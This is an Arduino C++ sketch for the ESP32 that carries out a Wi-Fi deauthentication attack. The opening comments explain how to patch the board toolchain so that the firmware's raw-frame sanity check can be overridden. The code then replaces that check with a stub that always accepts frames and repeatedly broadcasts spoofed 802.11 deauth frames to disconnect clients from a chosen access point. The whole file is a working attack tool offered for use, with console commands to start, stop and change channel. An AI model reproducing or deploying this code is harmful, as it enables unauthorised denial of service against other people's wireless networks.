//Code written by Aro
//For the project to work, the esp32 library version 2.0.10 downloaded from the board manager is required.
//
//With any text editor, open C:\Users\<USERNAME>\AppDate\Local\Arduino15\packages\esp32\hardware\esp32\2.0.10\platform.txt
//Add -w to the following compiler settings
//build.extra_flags.esp32
//build.extra_flags.esp32s2
//build.extra_flags.esp32s3
//build.extra_flags.esp32c3
//Add -zmuldefs to the following compiler settings
//compiler.c.elf.libs.esp32
//compiler.c.elf.libs.esp32s2
//compiler.c.elf.libs.esp32s3
//compiler.c.elf.libs.esp32c3
//
//
//To send a frame to a device you need to know its MAC address and channel. 
//The Mac address is entered manually in this code (ap and source), the channel is selected through the “channel X” console (I don’t know why, just for fun). 
//To start or stop sending a frame - start/stop command in the console



#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_event_loop.h"
#include "esp_log.h"
#include "nvs_flash.h"

//Code to allow the creation of custom frames or bypass
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3){
    if (arg == 31337)
      return 1;
    else
      return 0;
}
bool sending = false; // Flag indicating whether frames are currently being sent
// MAC source (ESP32)
uint8_t source_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,}; //change it
 //MAC client
uint8_t receiver_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF} This is a broadcast, that is, it sends an access point to all clients, you can enter the Mac of a specific client
 //MAC access point
uint8_t ap_mac[] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00,}; //change it
//Deauthentication of devices only works with the same wifi mac (ap and source)

// Deauthentication Frame Template
uint8_t deauth_frame_default[26] = {
    0xc0, 0x00, // type, subtype
    0x3a, 0x01, // duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // MAC client
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC source (ESP32)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC access point
    0xf0, 0xff, // fragment & squence number
    0x02, 0x00 // reason code
};

void setup() {
  Serial.begin(115200);
  delay(1000);

  // init NVS
  esp_err_t ret = nvs_flash_init();
  if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
    ESP_ERROR_CHECK(nvs_flash_erase());
    ret = nvs_flash_init();
  }
  ESP_ERROR_CHECK(ret);

  // init Wi-Fi
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA)); // Set station mode
  ESP_ERROR_CHECK(esp_wifi_start()); // start Wi-Fi

  // Enabling monitoring mode for the WiFi interface
  wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
  ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
}

void loop() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    if (command == "start") {
      sending = true; // Start sending frames
    } else if (command == "stop") {
      sending = false; // Stop sending frames
    } else if (command.startsWith("channel")) {
      // Getting the channel number from the "channel" command
      int channel = command.substring(7).toInt();
      // Channel set
      esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
  }

  if (sending) {
    // Send the frame to the selected device
    sendDeauthFrame();
    delay(200); // Pause between sending frames
  }
}

void sendDeauthFrame() {
  // Replace the client MAC address in the frame template
  for (int i = 0; i < 6; i++) {
    deauth_frame_default[4 + i] = receiver_mac[i];
  }
  // Replace the source MAC address in the frame template
  for (int i = 0; i < 6; i++) {
    deauth_frame_default[10 + i] = source_mac[i];
  }
  // Replace the MAC address of the access point in the frame template
  for (int i = 0; i < 6; i++) {
    deauth_frame_default[16 + i] = ap_mac[i];
  }

 // Send frame to device
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame_default, sizeof(deauth_frame_default), false);

  // Output frame contents to terminal for debugging
  Serial.println("Deauthentication Frame:");
  for (int i = 0; i < sizeof(deauth_frame_default); i++) {
    Serial.print(deauth_frame_default[i], HEX);
    Serial.print(" ");
  }
  Serial.println();
}